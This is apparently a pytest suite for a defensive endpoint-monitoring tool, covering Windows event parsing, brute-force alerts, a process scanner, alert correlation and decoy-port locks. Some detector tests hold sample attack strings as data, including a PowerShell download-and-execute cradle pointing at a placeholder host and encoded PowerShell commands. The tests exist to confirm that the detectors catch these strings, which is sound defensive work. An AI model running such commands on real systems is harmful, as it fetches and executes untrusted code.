"""
Tests for:
  #1 false-alarm fixes  (Windows event parsing/filtering, one finding per
                          Windows event, memory scanner, correlation by entity)
  #2 pseudo-lock restore (real decoy open/close, remote restore command)
  #4 Send Event          (test events injected through the command channel)
"""
import asyncio
import socket
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace

import pytest

from core.event_bus import EventBus
from core.events import (
    ActionRecord, AgentFinding, CorrelatedAlert, PseudoLockUpdate, ResponseAction,
    Severity, ThreatEvent, ThreatType,
)
from log_ingestion.windows_event_parser import (
    BruteForceTracker, extract_fields, is_service_account, should_drop, task_is_suspicious,
)
from log_ingestion.windows_ingestor import WindowsEventIngestor, parse_rules


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def _strings_4625(user="bob", ip="203.0.113.9", substatus="0xc000006a", logon_type="10"):
    s = [""] * 21
    s[5], s[6], s[7], s[9], s[10], s[13], s[18], s[19] = (
        user, "PC", "0xc000006d", substatus, logon_type, "PC", "C:\\x.exe", ip)
    return s


def _raw_event(event_id, strings, record=1, when=None):
    return SimpleNamespace(
        EventID=event_id, StringInserts=strings, ComputerName="GORILLA-PC",
        TimeGenerated=when or datetime.now(), RecordNumber=record,
    )


RULES_YAML = {
    "channels": ["Security", "System"],
    "brute_force": {"threshold": 5, "window_seconds": 300},
    "rules": [
        {"event_id": 4625, "threat_type": "identity_mismatch", "severity": "medium"},
        {"event_id": 4672, "threat_type": "identity_mismatch", "severity": "low"},
        {"event_id": 4740, "threat_type": "identity_mismatch", "severity": "high"},
        {"event_id": 1102, "threat_type": "anomalous_behavior", "severity": "critical"},
        {"event_id": 4698, "threat_type": "anomalous_behavior", "severity": "high"},
        {"event_id": 7045, "channel": "System", "threat_type": "anomalous_behavior", "severity": "high"},
    ],
}


@pytest.fixture
def ingestor():
    rules, channels, settings = parse_rules(RULES_YAML)
    return WindowsEventIngestor(EventBus(), log_names=channels, rules=rules, settings=settings)


# ---------------------------------------------------------------------------
# #1  Windows event parsing
# ---------------------------------------------------------------------------

class TestWindowsEventParser:
    def test_4625_uses_correct_field_positions(self):
        f = extract_fields(4625, _strings_4625())
        assert f["user_id"] == "bob"
        assert f["src_ip"] == "203.0.113.9"          # insert #19, not #18 (process name)
        assert f["failure_reason"] == "wrong password"
        assert "remote desktop" in f["logon_type"]
        assert "Failed logon for 'bob'" in f["description"]

    @pytest.mark.parametrize("name", ["SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE", "DWM-1",
                                      "UMFD-0", "GORILLA-PC$", "NT AUTHORITY\\SYSTEM", "-", ""])
    def test_service_accounts(self, name):
        assert is_service_account(name)

    @pytest.mark.parametrize("name", ["lalit", "Administrator", "bob"])
    def test_real_users_are_not_service_accounts(self, name):
        assert not is_service_account(name)

    def test_4672_for_system_is_dropped(self):
        f = extract_fields(4672, ["S-1-5-18", "SYSTEM", "NT AUTHORITY", "0x3e7"])
        assert should_drop(4672, f)

    def test_successful_ntlm_check_is_dropped(self):
        f = extract_fields(4776, ["MICROSOFT_AUTHENTICATION_PACKAGE_V1_0", "lalit", "PC", "0x0"])
        assert should_drop(4776, f)

    def test_suspicious_task_detection(self):
        assert task_is_suspicious("powershell.exe -w hidden -enc AAAA")
        assert not task_is_suspicious("C:\\Program Files\\BraveSoftware\\Update\\BraveUpdate.exe /ua")


class TestBruteForceTracker:
    def test_alerts_once_on_threshold_then_stays_quiet(self):
        t = BruteForceTracker(threshold=5, window_seconds=300)
        now = datetime(2026, 1, 1, 12, 0, 0)
        fields = {"user_id": "bob", "src_ip": "unknown"}
        results = [t.record(fields, now + timedelta(seconds=i)) for i in range(7)]
        assert results[:4] == [None] * 4
        assert results[4] and results[4]["count"] == 5 and results[4]["key"] == "bob"
        assert results[5] is None and results[6] is None       # cooldown

    def test_failures_spread_out_do_not_alert(self):
        t = BruteForceTracker(threshold=5, window_seconds=300)
        now = datetime(2026, 1, 1, 12, 0, 0)
        for i in range(10):
            assert t.record({"user_id": "bob"}, now + timedelta(minutes=2 * i)) is None


class TestIngestorNormalize:
    def test_single_failed_logon_stays_below_high(self, ingestor):
        ev = ingestor._normalize_event("Security", _raw_event(4625, _strings_4625()))
        ev = ingestor._apply_brute_force(ev)
        assert ev.severity == Severity.MEDIUM

    def test_five_failed_logons_become_one_high_alert(self, ingestor):
        base = datetime.now()
        severities = []
        for i in range(6):
            ev = ingestor._normalize_event(
                "Security", _raw_event(4625, _strings_4625(), record=i + 1, when=base + timedelta(seconds=i)))
            ev = ingestor._apply_brute_force(ev)
            severities.append(ev.severity)
        assert severities.count(Severity.HIGH) == 1
        assert severities[4] == Severity.HIGH

    def test_4672_system_is_ignored(self, ingestor):
        assert ingestor._normalize_event(
            "Security", _raw_event(4672, ["S-1-5-18", "SYSTEM", "NT AUTHORITY", "0x3e7"])) is None

    def test_rules_are_scoped_to_their_channel(self, ingestor):
        # Event ID 1102 in the Application log is NOT "audit log cleared"
        assert ingestor._normalize_event("Application", _raw_event(1102, ["x"])) is None
        ev = ingestor._normalize_event("Security", _raw_event(1102, ["S-1", "lalit", "PC", "0x1"]))
        assert ev.severity == Severity.CRITICAL
        assert "cleared by 'lalit'" in ev.payload["description"]

    def test_event_id_qualifiers_are_masked(self, ingestor):
        raw = _raw_event(0x40001B85, ["EvilSvc", "C:\\temp\\evil.exe", "user mode", "auto", "LocalSystem"])
        ev = ingestor._normalize_event("System", raw)
        assert ev is not None and ev.payload["event_id_raw"] == 7045
        assert "EvilSvc" in ev.payload["description"]

    def test_harmless_scheduled_task_is_not_high(self, ingestor):
        xml = "<Exec><Command>C:\\Program Files\\Brave\\BraveUpdate.exe</Command></Exec>"
        ev = ingestor._normalize_event(
            "Security", _raw_event(4698, ["S-1", "lalit", "PC", "0x1", "\\BraveUpdate", xml]))
        assert ev.severity == Severity.MEDIUM
        xml = "<Exec><Command>powershell.exe</Command><Arguments>-enc AAAA</Arguments></Exec>"
        ev = ingestor._normalize_event(
            "Security", _raw_event(4698, ["S-1", "lalit", "PC", "0x1", "\\Updater", xml]))
        assert ev.severity == Severity.HIGH


# ---------------------------------------------------------------------------
# #1  One honest finding per Windows event
# ---------------------------------------------------------------------------

@pytest.fixture
def all_agents_bus():
    from agents import (CyberThreatAgent, IdentityVerificationAgent, MalwareAnalysisAgent,
                        PhishingDetectionAgent, ZeroTrustAgent)
    bus = EventBus()
    findings = []

    async def capture(f: AgentFinding):
        findings.append(f)

    bus.subscribe(AgentFinding, capture)
    for cls in (CyberThreatAgent, IdentityVerificationAgent, MalwareAnalysisAgent,
                PhishingDetectionAgent, ZeroTrustAgent):
        cls(bus).register()
    return bus, findings


def _win_event(threat_type, severity, **payload):
    base = {"event_id_raw": 4740, "log_name": "Security", "computer_name": "GORILLA-PC",
            "user_id": "bob", "description": "Account 'bob' was locked out", "windows_event": True}
    base.update(payload)
    return ThreatEvent(source="windows_event_log:Security", threat_type=threat_type,
                       severity=severity, payload=base)


class TestOneFindingPerWindowsEvent:
    @pytest.mark.asyncio
    async def test_identity_event_gives_one_finding_without_revoke(self, all_agents_bus):
        bus, findings = all_agents_bus
        await bus.publish(_win_event(ThreatType.IDENTITY_MISMATCH, Severity.HIGH))
        assert len(findings) == 1
        f = findings[0]
        assert f.agent_name == "ZeroTrustAgent"
        assert "FAILED" not in f.summary and "locked out" in f.summary
        assert ResponseAction.REVOKE_IDENTITY not in f.actions
        assert ResponseAction.PSEUDO_LOCK not in f.actions

    @pytest.mark.asyncio
    async def test_other_windows_event_is_reported_by_cyber_agent_only(self, all_agents_bus):
        bus, findings = all_agents_bus
        await bus.publish(_win_event(ThreatType.ANOMALOUS_BEHAVIOR, Severity.CRITICAL,
                                     event_id_raw=1102, description="The Security audit log was cleared by 'x'"))
        assert [f.agent_name for f in findings] == ["CyberThreatAgent"]
        assert "audit log was cleared" in findings[0].summary


# ---------------------------------------------------------------------------
# #1  Memory scanner
# ---------------------------------------------------------------------------

def _proc(name, cmdline=None, rss_mb=100, pid=4242):
    return SimpleNamespace(info={
        "pid": pid, "name": name, "cmdline": cmdline or [name],
        "memory_info": SimpleNamespace(rss=rss_mb * 1024 * 1024),
    })


class TestMemoryScanner:
    @pytest.fixture
    def agent(self):
        from agents.cyber_threat_agent import CyberThreatAgent
        return CyberThreatAgent(EventBus())

    @pytest.mark.asyncio
    async def test_big_browser_is_not_an_alert(self, agent):
        assert await agent._check_memory_usage(_proc("brave.exe", rss_mb=2500)) is None

    @pytest.mark.parametrize("name", ["bitlocker.exe", "cryptowallet.exe", "encryptionsvc.exe", "cmd.exe"])
    def test_normal_names_are_not_ransomware(self, agent, name):
        assert agent._check_process_name(_proc(name)) is None

    def test_known_family_is_flagged(self, agent):
        assert agent._check_process_name(_proc("wannacry.exe")).threat_type == "RANSOMWARE"

    def test_plain_curl_is_not_suspicious(self, agent):
        assert agent._check_command_line(_proc("curl.exe", ["curl.exe", "https://example.com/a.zip"])) is None

    def test_powershell_download_cradle_is_suspicious(self, agent):
        cmd = ["powershell.exe", "-c", "IEX(New-Object Net.WebClient).DownloadString('http://x/a.ps1')"]
        t = agent._check_command_line(_proc("powershell.exe", cmd))
        assert t and t.threat_type == "SUSPICIOUS_DOWNLOAD"

    def test_encoded_powershell(self, agent):
        cmd = ["powershell.exe", "-NoP", "-EncodedCommand", "A" * 80]
        assert agent._check_command_line(_proc("powershell.exe", cmd)).threat_type == "ENCODED_POWERSHELL"

    @pytest.mark.asyncio
    async def test_analyse_never_kills_directly(self, agent):
        async def boom(pid):
            raise AssertionError("agent must not kill processes itself")
        agent._terminate_process = boom
        ev = ThreatEvent(source="memory_scanner", threat_type=ThreatType.NETWORK_INTRUSION,
                         severity=Severity.CRITICAL,
                         payload={"pid": 999, "process_name": "wannacry.exe",
                                  "memory_threat_type": "RANSOMWARE", "details": "x"})
        f = await agent.analyse(ev)
        assert f.metadata["pid"] == 999          # response engine can find it
        assert ResponseAction.TERMINATE_PROCESS in f.actions


# ---------------------------------------------------------------------------
# #1  Correlation needs a shared user / IP
# ---------------------------------------------------------------------------

def _finding(ttype, event_id, **meta):
    return AgentFinding(agent_name="T", event_id=event_id, threat_type=ttype,
                        severity=Severity.HIGH, confidence=0.8, summary="s",
                        actions=[ResponseAction.LOG], metadata=meta)


class TestCorrelationByEntity:
    @pytest.fixture
    def engine_and_alerts(self):
        from engines.correlation_engine import CorrelationEngine
        bus = EventBus()
        alerts = []

        async def capture(a: CorrelatedAlert):
            alerts.append(a)

        bus.subscribe(CorrelatedAlert, capture)
        eng = CorrelationEngine(bus)
        eng.start()
        return eng, alerts

    @pytest.mark.asyncio
    async def test_unrelated_findings_are_not_linked(self, engine_and_alerts):
        eng, alerts = engine_and_alerts
        await eng._ingest(_finding(ThreatType.NETWORK_INTRUSION, "e1",
                                   raw_payload={"src_ip": "10.0.0.45", "user_id": "unknown"}))
        await eng._ingest(_finding(ThreatType.IDENTITY_MISMATCH, "e2",
                                   user_id="SYSTEM", raw_payload={"computer_name": "PC", "device_id": "PC"}))
        assert alerts == []

    @pytest.mark.asyncio
    async def test_same_ip_is_linked(self, engine_and_alerts):
        eng, alerts = engine_and_alerts
        await eng._ingest(_finding(ThreatType.NETWORK_INTRUSION, "e1", raw_payload={"src_ip": "10.0.0.45"}))
        await eng._ingest(_finding(ThreatType.IDENTITY_MISMATCH, "e2", src_ip="10.0.0.45", user_id="bob"))
        assert len(alerts) == 1
        assert "10.0.0.45" in alerts[0].description


# ---------------------------------------------------------------------------
# #2  Pseudo-lock: real decoy, real restore
# ---------------------------------------------------------------------------

def _port_open(port):
    with socket.socket() as s:
        s.settimeout(0.5)
        return s.connect_ex(("127.0.0.1", port)) == 0


class TestPseudoLockRestore:
    @pytest.fixture
    def agent_and_updates(self):
        from agents.pseudo_lock_agent import PseudoLockAgent
        bus = EventBus()
        updates = []

        async def capture(u: PseudoLockUpdate):
            updates.append(u)

        bus.subscribe(PseudoLockUpdate, capture)
        return PseudoLockAgent(bus), updates

    @pytest.mark.asyncio
    async def test_remote_restore_really_closes_the_port(self, agent_and_updates):
        agent, updates = agent_and_updates
        rec = await agent.open_lock("lock_abc")
        assert _port_open(rec.decoy_port)
        assert updates[-1].active and updates[-1].decoy_port == rec.decoy_port

        result = await agent.remote_restore("lock_abc", {})
        assert result["closed"] is True
        await asyncio.sleep(0.05)
        assert not _port_open(rec.decoy_port)
        assert updates[-1].active is False and updates[-1].lock_id == "lock_abc"

    @pytest.mark.asyncio
    async def test_same_lock_twice_opens_one_port(self, agent_and_updates):
        agent, _ = agent_and_updates
        a = await agent.open_lock("lock_x")
        b = await agent.open_lock("lock_x")
        assert a is b and len(agent._decoy_servers) == 1
        await agent.stop()

    @pytest.mark.asyncio
    async def test_restore_unknown_lock_clears_dashboard(self, agent_and_updates):
        agent, updates = agent_and_updates
        result = await agent.remote_restore("lock_from_old_run", {})
        assert result["closed"] is False
        assert updates[-1].active is False and updates[-1].lock_id == "lock_from_old_run"

    @pytest.mark.asyncio
    async def test_remote_pseudo_lock_action_opens_real_decoy(self, agent_and_updates):
        from response.real_response_engine import RealResponseEngine
        agent, _ = agent_and_updates
        engine = RealResponseEngine(agent.bus, auto_response=False)
        records = []

        async def capture(r: ActionRecord):
            records.append((r.status, r.details, dict(r.metadata)))

        agent.bus.subscribe(ActionRecord, capture)
        engine.pseudo_lock_provider = agent
        await engine.execute_remote_action("pseudo_lock", "suspicious-host", {})
        status, details, meta = records[-1]
        assert status in ("active", "success")
        assert "Decoy listening" in details and meta.get("decoy_port")
        assert _port_open(meta["decoy_port"])
        await agent.stop()

    @pytest.mark.asyncio
    async def test_bridge_creates_lock_rows_only_from_real_decoys(self):
        from core.backend_bridge import DashboardBridge
        sent = []

        class _Q:
            async def add_to_endpoint(self, endpoint, payload):
                sent.append((endpoint, payload))

        bridge = object.__new__(DashboardBridge)
        bridge._queue = _Q()
        bridge._endpoint_id = "gorilla"
        # a finding that merely *asks* for a lock no longer creates a row
        await bridge._on_finding(AgentFinding(
            agent_name="X", event_id="e1", threat_type=ThreatType.NETWORK_INTRUSION,
            severity=Severity.HIGH, confidence=0.9, summary="s",
            actions=[ResponseAction.PSEUDO_LOCK]))
        assert [e for e, _ in sent] == ["findings"]
        await bridge._on_pseudo_lock_update(PseudoLockUpdate(lock_id="lock_e1", active=True, decoy_port=40000))
        await bridge._on_pseudo_lock_update(PseudoLockUpdate(lock_id="lock_e1", active=False))
        assert [e for e, _ in sent] == ["findings", "pseudo-lock", "pseudo-lock-restore"]
        assert sent[1][1]["decoy_port"] == 40000 and sent[1][1]["source"] == "gorilla"


# ---------------------------------------------------------------------------
# #4  Send Event through the command channel
# ---------------------------------------------------------------------------

class TestSendEvent:
    @pytest.mark.asyncio
    async def test_injected_event_reaches_the_bus(self):
        from core.test_event_injector import make_test_event_handler
        bus = EventBus()
        seen = []

        async def capture(e: ThreatEvent):
            seen.append(e)

        bus.subscribe(ThreatEvent, capture)
        handler = make_test_event_handler(bus)
        result = await handler("", {"event": {
            "source": "test-sensor", "event_type": "network_intrusion", "severity": "high",
            "message": "hi", "payload": {"src_ip": "10.0.0.1", "dst_port": 443, "bad": {"nested": 1}}}})
        assert len(seen) == 1 and result["event_id"] == seen[0].event_id
        assert seen[0].payload["src_ip"] == "10.0.0.1" and "bad" not in seen[0].payload
        assert seen[0].payload["test_event"] is True

    def test_validation_and_no_windows_masquerade(self):
        from core.test_event_injector import build_test_event
        with pytest.raises(RuntimeError):
            build_test_event({"event_type": "nope", "severity": "high"})
        ev = build_test_event({"event_type": "identity_mismatch", "severity": "high",
                               "source": "windows_event_log:Security"})
        assert not ev.source.startswith("windows_event_log")

    @pytest.mark.asyncio
    async def test_local_handler_result_is_returned_in_ack(self):
        from core.command_channel import CommandChannel, NAMESPACE

        class _Sio:
            def __init__(self):
                self.emitted = []

            def on(self, *a, **k):
                pass

            async def emit(self, event, data, namespace=None):
                self.emitted.append((event, data))

        async def local(target, params):
            return {"event_id": "abc123"}

        ch = CommandChannel(object(), "http://x", "k", "gorilla",
                            allowed_actions={"terminate_process"},
                            local_handlers={"inject_test_event": local})
        ch._sio = _Sio()
        await ch._handle_command({"cmd_id": "c1", "action": "inject_test_event", "target": ""})
        acks = [d for e, d in ch._sio.emitted if e == "agent:command-ack"]
        assert acks[-1]["status"] == "executed"
        assert acks[-1]["result"] == {"event_id": "abc123"}


class TestAllClearIsNotAnAlert:
    @pytest.mark.asyncio
    async def test_verified_network_traffic_is_low(self):
        from agents.zero_trust_agent import ZeroTrustAgent
        agent = ZeroTrustAgent(EventBus())
        ev = ThreatEvent(source="test-sensor", threat_type=ThreatType.NETWORK_INTRUSION,
                         severity=Severity.CRITICAL, payload={"src_ip": "10.0.0.45", "dst_port": 8080})
        f = await agent.analyse(ev)
        if "verified" in f.summary:
            assert f.severity == Severity.LOW


class _FakeEvtLog:
    """Mimics win32evtlog's classic API: records are read newest-first in batches."""
    EVENTLOG_BACKWARDS_READ = 8
    EVENTLOG_SEQUENTIAL_READ = 1

    def __init__(self):
        self.logs = {"Security": []}
        self._cursors = {}

    def add(self, name, event_id, strings):
        recs = self.logs[name]
        num = (recs[-1].RecordNumber + 1) if recs else 1
        recs.append(_raw_event(event_id, strings, record=num))

    def OpenEventLog(self, server, name):
        if name not in self.logs:
            raise OSError("access denied")
        h = object()
        self._cursors[h] = [name, len(self.logs[name])]
        return h

    def CloseEventLog(self, h):
        self._cursors.pop(h, None)

    def GetNumberOfEventLogRecords(self, h):
        return len(self.logs[self._cursors[h][0]])

    def GetOldestEventLogRecord(self, h):
        recs = self.logs[self._cursors[h][0]]
        return recs[0].RecordNumber if recs else 0

    def ReadEventLog(self, h, flags, offset):
        name, pos = self._cursors[h]
        recs = self.logs[name]
        batch = list(reversed(recs[max(pos - 3, 0):pos]))   # 3 per batch, newest first
        self._cursors[h][1] = max(pos - 3, 0)
        return batch


class TestTailing:
    def test_reads_only_new_records_in_order(self, ingestor, monkeypatch):
        import log_ingestion.windows_ingestor as wi
        fake = _FakeEvtLog()
        monkeypatch.setattr(wi, "win32evtlog", fake, raising=False)
        for i in range(10):                                  # old history
            fake.add("Security", 4624, ["x"] * 20)
        last = ingestor._newest_record("Security")
        assert last == 10
        recs, last = ingestor._read_new_records("Security", last)
        assert recs == []                                   # history is NOT replayed
        for i in range(7):
            fake.add("Security", 4625, _strings_4625(user=f"u{i}"))
        recs, last = ingestor._read_new_records("Security", last)
        assert [r.RecordNumber for r in recs] == list(range(11, 18))   # oldest -> newest
        assert last == 17
        recs, last = ingestor._read_new_records("Security", last)
        assert recs == []

    def test_log_cleared_resyncs(self, ingestor, monkeypatch):
        import log_ingestion.windows_ingestor as wi
        fake = _FakeEvtLog()
        monkeypatch.setattr(wi, "win32evtlog", fake, raising=False)
        for _ in range(5):
            fake.add("Security", 4624, ["x"] * 20)
        last = ingestor._newest_record("Security")
        fake.logs["Security"] = []                           # admin clears the log
        fake.add("Security", 1102, ["S-1", "eve", "PC", "0x1"])
        recs, last = ingestor._read_new_records("Security", last)
        assert [r.EventID for r in recs] == [1102] and last == 1


class TestHttpsIsNotSuspicious:
    def test_port_443_is_normal(self):
        from agents.cyber_threat_agent import _ENCRYPTED_TRAFFIC
        assert 443 not in _ENCRYPTED_TRAFFIC["suspicious_ports"]
        assert {22, 3389} <= _ENCRYPTED_TRAFFIC["suspicious_ports"]


class TestRound3Fixes:
    def test_routine_group_add_is_low(self):
        import yaml, pathlib
        data = yaml.safe_load((pathlib.Path(__file__).parent.parent / "config" / "event_rules.yaml").read_text())
        rules, channels, settings = parse_rules(data)
        ingestor = WindowsEventIngestor(EventBus(), log_names=channels, rules=rules, settings=settings)
        # 4732: member added to local group 'Users' (automatic on net user /add)
        s = ["-", "S-1-5-21-1-2-3-1005", "Users", "BUILTIN", "S-1-5-32-545",
             "S-1-5-21-1-2-3-1001", "lalit", "PC", "0x1", "-"]
        ev = ingestor._normalize_event("Security", _raw_event(4732, s))
        assert ev is not None and ev.severity.value == "low"
        s[2] = "Administrators"
        ev = ingestor._normalize_event("Security", _raw_event(4732, s))
        assert ev.severity.value == "high"
        assert "Administrators" in ev.payload["description"]

    @pytest.mark.asyncio
    async def test_identity_all_clear_is_low(self):
        from agents.identity_agent import IdentityVerificationAgent
        from core.event_bus import EventBus
        from core.events import ThreatEvent, ThreatType, Severity
        agent = IdentityVerificationAgent(EventBus())
        ev = ThreatEvent(source="test-sensor", threat_type=ThreatType.IDENTITY_MISMATCH,
                         severity=Severity.CRITICAL, payload={"src_ip": "10.0.0.1"})
        f = await agent.analyse(ev)
        assert f.severity == Severity.LOW
        assert "no identity problems found" in f.summary

    @pytest.mark.asyncio
    async def test_identity_real_problem_still_alerts(self):
        from agents.identity_agent import IdentityVerificationAgent
        from core.event_bus import EventBus
        from core.events import ThreatEvent, ThreatType, Severity
        agent = IdentityVerificationAgent(EventBus())
        ev = ThreatEvent(source="badge", threat_type=ThreatType.IDENTITY_MISMATCH,
                         severity=Severity.HIGH,
                         payload={"user_id": "bob", "biometric_score": 0.2,
                                  "claimed_location": "Mumbai", "detected_location": "Moscow"})
        f = await agent.analyse(ev)
        assert f.severity in (Severity.HIGH, Severity.CRITICAL)

    @pytest.mark.asyncio
    @pytest.mark.parametrize("sig,locks", [("RANSOMWARE_C2", True), ("SQL_INJECTION", True),
                                           ("SSH_BRUTE_FORCE", True), ("PORT_SCAN", False)])
    async def test_send_event_signatures(self, sig, locks):
        from agents.cyber_threat_agent import CyberThreatAgent
        from core.event_bus import EventBus
        from core.events import ThreatEvent, ThreatType, Severity, ResponseAction
        agent = CyberThreatAgent(EventBus())
        ev = ThreatEvent(source="test-sensor", threat_type=ThreatType.NETWORK_INTRUSION,
                         severity=Severity.HIGH,
                         payload={"src_ip": "10.0.0.1", "dst_port": 443, "signature": sig})
        f = await agent.analyse(ev)
        assert (ResponseAction.PSEUDO_LOCK in f.actions) is locks
        assert "suspicious port 443" not in f.summary


class TestAuditPolicyCheck:
    @pytest.mark.parametrize("out,expected", [
        ("System audit policy\nCategory/Subcategory      Setting\nLogon/Logoff\n  Logon                     Success\n", False),
        ("Logon/Logoff\n  Logon                     Success and Failure\n", True),
        ("Logon/Logoff\n  Logon                     No Auditing\n", False),
        ("Anmelden/Abmelden\n  Anmelden                  Erfolg\n", None),
    ])
    def test_parse_auditpol(self, out, expected):
        assert WindowsEventIngestor.logon_failure_auditing(out) is expected


class TestRunasBruteForceEndToEnd:
    """Replay of the user's real test: 5 x `runas /user:lalit cmd` with a wrong password."""

    @pytest.mark.asyncio
    async def test_five_runas_failures_give_one_high_finding(self):
        import yaml, pathlib, asyncio
        from datetime import timedelta
        from core.events import AgentFinding
        from agents.cyber_threat_agent import CyberThreatAgent
        from agents.zero_trust_agent import ZeroTrustAgent
        from agents.identity_agent import IdentityVerificationAgent
        data = yaml.safe_load((pathlib.Path(__file__).parent.parent / "config" / "event_rules.yaml").read_text())
        rules, channels, settings = parse_rules(data)
        bus = EventBus()
        ing = WindowsEventIngestor(bus, log_names=channels, rules=rules, settings=settings)
        for a in (CyberThreatAgent(bus), ZeroTrustAgent(bus), IdentityVerificationAgent(bus)):
            a.register()
        findings = []

        async def collect(f):
            findings.append(f)
        bus.subscribe(AgentFinding, collect)

        t0 = datetime.now()
        for i in range(7):
            s = ["S-1-5-21-1-2-3-1001", "lalit", "ANONMOYOUS", "0x5d7a1", "S-1-0-0", "lalit",
                 "ANONMOYOUS", "0xc000006d", "%%2313", "0xc000006a", "2", "seclogo", "Negotiate",
                 "ANONMOYOUS", "-", "-", "0", "0x1f4", "C:\\\\Windows\\\\System32\\\\svchost.exe", "::1", "0"]
            ev = ing._normalize_event("Security", _raw_event(4625, s, record=100 + i,
                                                             when=t0 + timedelta(seconds=2 * i)))
            ev = ing._apply_brute_force(ev)
            if ev.severity.weight >= ing.min_severity.weight:
                await bus.publish(ev)
        await asyncio.sleep(0.3)
        high = [f for f in findings if f.severity.value == "high"]
        assert len(high) == 1, [f.summary for f in findings]
        assert "Possible password guessing: 5 failed logons for user 'lalit'" in high[0].summary
